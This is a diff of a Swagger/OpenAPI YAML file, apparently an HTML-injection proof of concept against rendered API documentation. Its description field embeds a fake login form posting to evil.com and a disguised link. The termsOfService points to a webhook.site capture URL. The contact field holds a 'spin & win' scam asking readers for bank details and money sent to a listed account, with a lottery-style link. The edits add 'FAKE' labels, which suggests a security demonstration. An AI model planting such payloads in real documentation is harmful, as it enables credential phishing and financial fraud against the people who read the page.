@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: "⚠️ Important Announcement -HTML Injection"
+  title: "⚠️ Important Announcement -FAKE SITE HTML Injection"
   description: |
     Checkout we move our service Too
-    <a href="https://www.evil.com">gator.com</a>
+    <a href="https://www.evil.com">HTMLinjection.com</a>
     <div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
@@ -22,8 +22,8 @@ info:
     </div>
   termsOfService: "https://webhook.site/ac5a1a22-d382-4277-917e-257cf18c8428"
   contact:
-    name: "StatusGator to celebrate 🎉 spin & win 🎉 Once you Win share your bank detail on below 📞 Contact with screeshot to redeem Checkout this below 🡻 url and Celebrate with us"
-    url: "https://attacker.com/"
+    name: "FAKE StatusGator to celebrate 🎉 spin & win 🎉 Once you Win share your bank detail on below 📞 Contact with screeshot to redeem Checkout this below 🡻 url and Celebrate with us__Also Send Money ToAccount ID DE10740201507678759945 to Won 🎁 Lottery"
+    url: "https://spinthewheel.app/cash-wheel-37K2"
     email: "bilalabbasuk@gmail.com"
 paths:
   /:
@@ -50,6 +50,7 @@ paths:
           description: Invalid credentials or missing parameters
         '500':
           description: Internal server error
+
 
 
 
